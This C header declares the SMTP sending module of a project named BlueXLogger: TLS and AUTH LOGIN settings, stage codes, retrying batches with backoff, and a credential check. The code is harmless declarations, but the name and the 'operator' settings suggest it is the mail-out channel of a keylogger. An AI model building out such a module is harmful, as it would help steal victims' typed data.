/*============================================================================
 * BlueXLogger - bxl_smtp.h
 * SMTP submission client with implicit TLS, STARTTLS and AUTH LOGIN.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * The whole transaction is retried with exponential backoff. A transient
 * failure (network error or 4xx reply) is never allowed to drop a batch.
 *==========================================================================*/
#ifndef BXL_SMTP_H
#define BXL_SMTP_H

#include "bxl_common.h"
#include "bxl_config.h"
#include "bxl_mime.h"
#include "bxl_net.h"

typedef struct BxlSmtpConfig {
    char host[BXL_MAX_HOST];
    int  port;
    int  tls_mode;          /* BXL_TLS_*                                  */
    int  auth;
    char user[BXL_MAX_EMAIL];
    char password[BXL_MAX_PASS];
    int  timeout_ms;
    int  max_attempts;      /* >= 1                                       */
    int  retry_base_ms;     /* first backoff delay                        */
    char client_name[64];   /* used in EHLO                               */
} BxlSmtpConfig;

/* How far a transaction got. A failure carries the stage it died in, so a
 * caller can tell "the host is unreachable" apart from "the password is
 * wrong" without parsing English out of error[]. */
#define BXL_SMTP_STAGE_NONE        0
#define BXL_SMTP_STAGE_CONNECT     1   /* TCP connect                       */
#define BXL_SMTP_STAGE_TLS         2   /* implicit TLS handshake            */
#define BXL_SMTP_STAGE_GREETING    3   /* 220 banner                        */
#define BXL_SMTP_STAGE_EHLO        4   /* EHLO / HELO                       */
#define BXL_SMTP_STAGE_STARTTLS    5   /* STARTTLS accepted                 */
#define BXL_SMTP_STAGE_TLS_UPGRADE 6   /* handshake after STARTTLS          */
#define BXL_SMTP_STAGE_EHLO_TLS    7   /* EHLO again inside the tunnel      */
#define BXL_SMTP_STAGE_AUTH        8   /* AUTH LOGIN                        */
#define BXL_SMTP_STAGE_MAIL_FROM   9
#define BXL_SMTP_STAGE_RCPT_TO     10
#define BXL_SMTP_STAGE_DATA        11
#define BXL_SMTP_STAGE_BODY        12
#define BXL_SMTP_STAGE_ACCEPT      13  /* server took the message           */
#define BXL_SMTP_STAGE_RSET        14  /* verify-only: credentials worked   */

typedef struct BxlSmtpResult {
    int  ok;
    int  attempts;
    int  stage;             /* BXL_SMTP_STAGE_* - last stage reached      */
    int  last_code;
    char last_line[512];
    char error[512];
    bxl_u32 elapsed_ms;
} BxlSmtpResult;

/* Human-readable name of a stage, for logs and dialogs. */
const wchar_t *bxl_smtp_stage_name(int stage);

/* Populate a config from the operator configuration. */
void bxl_smtp_config_from(const BxlConfig *cfg, BxlSmtpConfig *out);

/* Perform a full MAIL FROM / RCPT TO / DATA transaction.
 * Returns BXL_TRUE when the server accepted the message. */
int bxl_smtp_send(const BxlSmtpConfig *scfg, const BxlMessage *msg,
                  BxlSmtpResult *res);

/* Verify credentials without sending mail (RSET + QUIT after AUTH). */
int bxl_smtp_verify(const BxlSmtpConfig *scfg, BxlSmtpResult *res);

/* True when a reply code is worth retrying (4xx / connection level). */
int bxl_smtp_code_is_transient(int code);

#endif /* BXL_SMTP_H */
